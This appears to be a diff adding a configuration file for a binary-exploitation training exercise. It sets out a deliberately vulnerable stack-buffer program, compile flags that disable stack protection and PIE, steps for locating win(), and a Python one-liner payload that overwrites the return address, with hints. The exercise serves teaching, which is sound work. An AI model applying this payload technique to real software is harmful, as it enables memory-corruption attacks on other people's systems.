@@ -1,0 +1,39 @@
+[exercise]
+number      = 1
+name        = "Return-Oriented Hijacking"
+module      = "Binary Mastery — Memory Corruption"
+verify_mode = "auto"
+
+description = """
+A program reads your input from stdin with read().
+It copies up to 128 bytes into a 16-byte stack buffer.
+The function win() exists in the binary but is never called."""
+
+objective = """
+Force the program to execute win() by overwriting
+the return address stored on the stack."""
+
+steps = [
+    "Compile: gcc -fno-stack-protector -no-pie -o horizon_01 horizon_01.c",
+    "Find the address of win(): nm horizon_01 | grep win",
+    "Calculate the padding: buffer size (16) + saved RBP (8) = 24 bytes",
+    "Send the payload via stdin:",
+    "  python3 -c \"import sys,struct; sys.stdout.buffer.write(b'A'*24 + struct.pack('<Q', 0xADDR))\" | ./horizon_01",
+    "Replace 0xADDR with the address found in step 2.",
+]
+
+[compile]
+source = "horizon_01.c"
+output = "horizon_01"
+flags  = ["-fno-stack-protector", "-no-pie"]
+
+[[hints]]
+text = "Start by compiling and look for the 'win' symbol with nm. That is your target address."
+
+[[hints]]
+text = "The required padding = local buffer size + 8 bytes (saved RBP). Here: 16 + 8 = 24."
+
+[[hints]]
+text = """64-bit addresses are stored in Little Endian: 0x401140 becomes \\x40\\x11\\x40\\x00\\x00\\x00\\x00\\x00.
+struct.pack('<Q', addr) handles that automatically.
+Use stdin (not argv) to safely pass null bytes in the address."""
